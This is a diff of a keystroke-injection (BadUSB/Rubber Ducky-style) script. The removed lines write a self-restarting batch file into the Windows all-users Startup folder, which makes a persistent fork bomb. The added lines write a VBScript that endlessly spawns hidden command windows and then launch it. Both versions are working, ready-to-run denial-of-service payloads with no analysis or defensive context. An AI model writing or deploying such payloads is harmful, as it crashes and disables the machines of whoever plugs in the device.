@@ -1,27 +1,18 @@
-GUI
-DELAY 200
-STRING CMD
+DELAY 1000
+GUI r
 DELAY 500
-CTRL SHIFT ENTER
+STRING cmd
+ENTER
 DELAY 500
-LEFT
-DELAY 200
+STRING copy con forkb.vbs
 ENTER
-DELAY 200
-STRING cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
+STRING do
 ENTER
-STRING copy con a.bat
+STRING CreateObject("Wscript.Shell").Run "cmd", 0, False
 ENTER
-STRING @echo off
+STRING loop
+CTRL z
 ENTER
-STRING :START
+DELAY 50
+STRING start forkb.vbs && exit
 ENTER
-STRING start a.bat 
-ENTER
-STRING GOTO START
-ENTER
-CTRL c
-ENTER
-STRING a.bat
-ENTER
-ALT F4
